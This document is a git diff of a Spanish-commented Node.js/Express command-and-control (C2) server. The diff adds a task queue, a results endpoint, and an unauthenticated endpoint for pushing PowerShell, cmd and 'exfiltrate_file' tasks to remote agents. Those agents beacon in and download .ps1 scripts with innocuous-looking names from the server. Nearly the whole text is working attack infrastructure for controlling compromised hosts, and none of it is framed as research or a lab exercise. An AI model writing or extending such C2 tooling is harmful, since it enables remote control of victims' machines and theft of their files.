@@ -16,18 +16,19 @@ if (fs.existsSync(envPath)) { // fs.existsSync necesita 'fs'
 const app = express();
 const PORT = process.env.PORT || 3005; // Render seteará process.env.PORT
 
-// --- Configuración de Logging ---
-// Crear un stream de escritura para los logs de morgan (logs HTTP)
-// Los logs de morgan irán a la consola, Render los captura.
-app.use(morgan('dev'));
+// --- Middlewares ---
+app.use(morgan('dev')); // Logging HTTP
+app.use(express.json()); // Para parsear cuerpos de solicitud JSON (necesario para /sendresult)
+// --------------------
 
-// Crear directorio de logs si no existe para los logs de beacons/comandos
-const logsDir = path.join(path.resolve(), 'logs'); // path.resolve() da el dir actual del proyecto
+// --- Configuración de Logging ---
+const logsDir = path.join(path.resolve(), 'logs');
 if (!fs.existsSync(logsDir)) {
     fs.mkdirSync(logsDir, { recursive: true });
 }
 const beaconLogStream = fs.createWriteStream(path.join(logsDir, 'beacons.log'), { flags: 'a' });
 const commandLogStream = fs.createWriteStream(path.join(logsDir, 'commands.log'), { flags: 'a' });
+const taskResultsLogStream = fs.createWriteStream(path.join(logsDir, 'task_results.log'), { flags: 'a' });
 
 function logToFile(stream, message) {
     const timestamp = new Date().toISOString();
@@ -37,10 +38,14 @@ function logToFile(stream, message) {
 // -----------------------------
 
 // --- Servir Archivos Estáticos ---
-// Servir los scripts .ps1 desde la carpeta 'public'
 const publicDir = path.join(path.resolve(), 'public');
 app.use('/files', express.static(publicDir)); // Accedido vía /files/core_services_mvp1.ps1
 // ------------------------------
+
+// --- Almacenamiento de Tareas en Memoria (Simple) ---
+let tasks_pending = {}; // Ejemplo: { 'agent123': [{ task_id: 't1', command: 'whoami', type: 'powershell' }] }
+let nextTaskId = 1;
+// --------------------------------------------------
 
 // --- Rutas del C2 ---
 // Endpoint de Beacon (MVP1)
@@ -49,30 +54,88 @@ app.get('/api/updates', (req, res) => {
     const phase = req.query.phase || 'UnknownPhase';
     const message = `Beacon recibido de: ${agentId} (Fase: ${phase})`;
     
-    console.log(`[+] ${message}`); // Log a la consola (Render lo captura)
-    logToFile(beaconLogStream, message); // Log a beacons.log
+    console.log(`[+] ${message}`);
+    logToFile(beaconLogStream, message);
     
+    // Opcional: Crear una cola de tareas para un nuevo agente si no existe
+    if (!tasks_pending[agentId]) {
+        tasks_pending[agentId] = [];
+        logToFile(commandLogStream, `Nueva cola de tareas creada para el agente: ${agentId}`);
+    }
+
     res.status(200).send('Beacon received by C2 server (MVP1 - Express)\n');
 });
+
+// Endpoint para que el agente solicite tareas (MVP2)
+app.get('/api/tasks/:agentId/get', (req, res) => {
+    const agentId = req.params.agentId;
+    logToFile(commandLogStream, `Agente ${agentId} solicitando tarea.`);
+
+    if (tasks_pending[agentId] && tasks_pending[agentId].length > 0) {
+        const task = tasks_pending[agentId].shift(); // Obtener y remover la primera tarea
+        logToFile(commandLogStream, `Enviando tarea ID ${task.task_id} (${task.command}) al agente ${agentId}.`);
+        res.status(200).json(task);
+    } else {
+        logToFile(commandLogStream, `No hay tareas pendientes para el agente ${agentId}. Enviando comando de dormir.`);
+        res.status(200).json({ task_id: `sleep_${Date.now()}`, command: 'sleep', type: 'internal' }); // O simplemente 204 No Content
+    }
+});
+
+// Endpoint para que el agente envíe resultados de tareas (MVP2)
+app.post('/api/results/:agentId/send', (req, res) => {
+    const agentId = req.params.agentId;
+    const result = req.body; // Asume que el resultado viene en el cuerpo como JSON
+
+    if (!result || !result.task_id) {
+        logToFile(taskResultsLogStream, `Resultado inválido recibido del agente ${agentId}: cuerpo vacío o sin task_id.`);
+        return res.status(400).send('Resultado inválido: se requiere task_id.');
+    }
+
+    const message = `Resultado recibido del agente ${agentId} para la tarea ${result.task_id}: ${JSON.stringify(result.output).substring(0,200)}...`;
+    console.log(`[+] ${message}`);
+    logToFile(taskResultsLogStream, message);
+    
+    // Aquí podrías procesar más el resultado, guardarlo en DB, etc.
+    res.status(200).send('Resultado recibido por el C2.');
+});
+
+// Endpoint para añadir una tarea (para pruebas, podrías protegerlo más adelante)
+app.post('/api/tasks/:agentId/add', (req, res) => {
+    const agentId = req.params.agentId;
+    const { command, type = 'powershell', payload_b64 } = req.body; // payload_b64 es opcional
+
+    if (!command) {
+        return res.status(400).send('Se requiere el campo "command".');
+    }
+
+    const newTask = {
+        task_id: `task_${nextTaskId++}`,
+        command: command,
+        type: type, // 'powershell', 'cmd', 'exfiltrate_file', etc.
+        payload_b64: payload_b64 // Para comandos que necesitan un payload o ruta de archivo
+    };
+
+    if (!tasks_pending[agentId]) {
+        tasks_pending[agentId] = [];
+    }
+    tasks_pending[agentId].push(newTask);
+    const message = `Nueva tarea añadida para ${agentId}: ID ${newTask.task_id} (${newTask.command})`;
+    logToFile(commandLogStream, message);
+    res.status(201).json({ message: "Tarea añadida", task: newTask });
+});
+
 
 // Health Check Endpoint para Render
 app.get('/api/health', (req, res) => {
     res.status(200).send('OK');
 });
-
-// Futuros endpoints para MVP2: /gettask, /sendresult
-// app.post('/api/tasks/:agentId/get', (req, res) => { ... });
-// app.post('/api/results/:agentId/send', express.json(), (req, res) => { ... });
 // -----------------
 
 // --- Manejo de Errores Básico ---
-app.use((req, res) => { // Eliminado _next ya que no se usa y no es un error handler
+app.use((req, res) => {
     res.status(404).send("Endpoint no encontrado en C2 Express\n");
 });
 
-// Para el error handler, Express necesita 4 argumentos para identificarlo como tal.
-// Si ESLint sigue quejándose de _next no usado, se deberá ajustar la config de ESLint
-// o aceptar la advertencia para este caso específico.
 app.use((err, req, res, _next) => {
     console.error("Error en C2 Express:", err.stack);
     logToFile(commandLogStream, `SERVER_ERROR: ${err.message} - Stack: ${err.stack}`);
@@ -83,6 +146,9 @@ app.use((err, req, res, _next) => {
 const server = app.listen(PORT, () => {
     console.log(`Servidor C2 (Express) escuchando en el puerto ${PORT}`);
     console.log(`  -> Endpoint de beacon: GET /api/updates?uid=AGENT_ID&phase=mvpX`);
+    console.log(`  -> Endpoint de solicitud de tareas: GET /api/tasks/:agentId/get`);
+    console.log(`  -> Endpoint de envío de resultados: POST /api/results/:agentId/send`);
+    console.log(`  -> Endpoint de adición de tareas (test): POST /api/tasks/:agentId/add`);
     console.log(`  -> Archivos estáticos servidos desde /files (ej. /files/installer_mvp1.ps1)`);
     logToFile(commandLogStream, `Servidor C2 iniciado en puerto ${PORT}.`);
 });
